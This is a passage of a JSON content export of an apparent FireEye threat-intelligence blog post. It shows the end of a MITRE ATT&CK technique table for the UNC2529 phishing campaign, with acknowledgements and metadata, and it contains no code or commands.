(T1588.004)\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022311\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EInitial Access\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022313\u0022 valign=\u0022top\u0022\u003E\u003Cul\u003E\n\u003Cli\u003E\u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/attack.mitre.org\/techniques\/T1566\/\u0022\u003EPhishing\u003C\/a\u003E (T1566)\u003Cul\u003E\n\u003Cli\u003E\u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/attack.mitre.org\/techniques\/T1566\/002\/\u0022\u003ESpearphishing Link\u003C\/a\u003E (T1566.002)\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022311\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EExecution\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022313\u0022 valign=\u0022top\u0022\u003E\u003Cul\u003E\n\u003Cli\u003E\u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/attack.mitre.org\/techniques\/T1204\/\u0022\u003EUser Execution\u003C\/a\u003E (T1204)\u003Cul\u003E\n\u003Cli\u003E\u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/attack.mitre.org\/techniques\/T1204\/001\/\u0022\u003EMalicious Link\u003C\/a\u003E (T1204.001)\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003Cli\u003E\u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/attack.mitre.org\/techniques\/T1059\u0022\u003ECommand and Scripting Interpreter\u003C\/a\u003E (T1059)\u003Cul\u003E\n\u003Cli\u003E\u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/attack.mitre.org\/techniques\/T1059\/005\u0022\u003EVisual Basic\u003C\/a\u003E (T1059.005)\u003C\/li\u003E\n\u003Cli\u003E\u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/attack.mitre.org\/techniques\/T1059\/007\u0022\u003EJavaScript\/JScript\u003C\/a\u003E (T1059.007)\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022311\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EPrivilege Escalation\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022313\u0022 valign=\u0022top\u0022\u003E\u003Cul\u003E\n\u003Cli\u003E\u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/attack.mitre.org\/techniques\/T1055\u0022\u003EProcess Injection\u003C\/a\u003E (T1055)\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022311\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EDefense Evasion\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022313\u0022 valign=\u0022top\u0022\u003E\u003Cul\u003E\n\u003Cli\u003E\u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/attack.mitre.org\/techniques\/T1070\u0022\u003EIndicator Removal on Host\u003C\/a\u003E (T1070)\u003Cul\u003E\n\u003Cli\u003E\u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/attack.mitre.org\/techniques\/T1070\/004\u0022\u003EFile Deletion\u003C\/a\u003E (T1070.004)\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003Cli\u003E\u003Ca href=\u0022https:\/\/attack.mitre.org\/techniques\/T1027\u0022\u003EObfuscated Files or Information\u003C\/a\u003E\u0026nbsp;(T1027)\u003C\/li\u003E\n\u003Cli\u003E\u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/attack.mitre.org\/techniques\/T1055\u0022\u003EProcess Injection\u003C\/a\u003E (T1055)\u003C\/li\u003E\n\u003Cli\u003E\u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/attack.mitre.org\/techniques\/T1112\u0022\u003EModify Registry\u003C\/a\u003E (T1112)\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022311\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EDiscovery\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022313\u0022 valign=\u0022top\u0022\u003E\u003Cul\u003E\n\u003Cli\u003E\u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/attack.mitre.org\/techniques\/T1033\u0022\u003ESystem Owner\/User Discovery\u003C\/a\u003E (T1033)\u003C\/li\u003E\n\u003Cli\u003E\u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/attack.mitre.org\/techniques\/T1057\u0022\u003EProcess Discovery\u003C\/a\u003E (T1057)\u003C\/li\u003E\n\u003Cli\u003E\u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/attack.mitre.org\/techniques\/T1082\u0022\u003ESystem Information Discovery\u003C\/a\u003E (T1082)\u003C\/li\u003E\n\u003Cli\u003E\u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/attack.mitre.org\/techniques\/T1087\u0022\u003EAccount Discovery\u003C\/a\u003E (T1087)\u003C\/li\u003E\n\u003Cli\u003E\u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/attack.mitre.org\/techniques\/T1518\u0022\u003ESoftware Discovery\u003C\/a\u003E (T1518)\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022311\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ECollection\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022313\u0022 valign=\u0022top\u0022\u003E\u003Cul\u003E\n\u003Cli\u003E\u003Ca href=\u0022https:\/\/attack.mitre.org\/techniques\/T1113\u0022\u003EScreen Capture\u003C\/a\u003E\u0026nbsp;(T1113)\u003C\/li\u003E\n\u003Cli\u003E\u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/attack.mitre.org\/techniques\/T1560\u0022\u003EArchive Collected Data\u003C\/a\u003E (T1560)\u003Cul\u003E\n\u003Cli\u003E\u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/attack.mitre.org\/techniques\/T1560\/001\u0022\u003EArchive via Utility\u003C\/a\u003E (T1560.001)\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022311\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ECommand and Control\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022313\u0022 valign=\u0022top\u0022\u003E\u003Cul\u003E\n\u003Cli\u003E\u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/attack.mitre.org\/techniques\/T1071\u0022\u003EApplication Layer Protocol\u003C\/a\u003E (T1071)\u003Cul\u003E\n\u003Cli\u003E\u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/attack.mitre.org\/techniques\/T1071\/001\u0022\u003EWeb Protocols\u003C\/a\u003E (T1071.001)\u003C\/li\u003E\n\u003Cli\u003E\u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/attack.mitre.org\/techniques\/T1573\/002\u0022\u003EAsymmetric Cryptography\u003C\/a\u003E (T1573.002)\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Ch4\u003EAcknowledgements\u003C\/h4\u003E\n\u003Cp\u003EThank you to Tyler McLellan, Dominik Weber, Michael Durakovich and Jeremy Kennelly for technical review of this content. In addition, thank you to Nico Paulo Yturriaga and Evan Reese for outstanding signature creation, and Ana Foreman for graphics support.\u003C\/p\u003E\n",
        "jcr:lastModified": "Wed May 05 2021 00:59:10 GMT+0000",
        "sling:resourceType": "social\/blog\/components\/entrytext"
      }
    },
    "summary": {
      "jcr:primaryType": "nt:unstructured",
      "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
      "text": "\u003Cp\u003EWe observed a widespread, global phishing campaign from UNC2529 targeting numerous organizations across an array of industries.\u003C\/p\u003E\n",
      "jcr:lastModified": "Mon May 03 2021 19:29:49 GMT+0000",
      "sling:resourceType": "social\/blog\/components\/entrytextteaser"
    },
    "image": {
      "jcr:primaryType": "nt:unstructured",
      "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
      "jcr:lastModified": "Mon May 03 2021 19:31:19 GMT+0000",
      "imageRotate": "0"
    }
  }
}
